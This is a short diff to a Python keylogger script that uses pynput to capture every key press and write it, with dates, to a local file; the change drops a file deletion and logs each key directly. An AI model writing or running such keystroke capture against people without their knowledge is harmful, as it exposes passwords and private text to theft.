@@ -2,13 +2,11 @@ from pynput.keyboard import Key, Listener
 from datetime import date, datetime
 import os
 
-os.remove("keys_logged.txt")
 keys = []
 
 #this function prints the pressed key
 def on_press(key):
-   keys.append(key)
-   write_to_file(keys)
+   write_to_file(key)
 
 #this is a function that writes the keys, with dates to the file
 def write_to_file(keys):
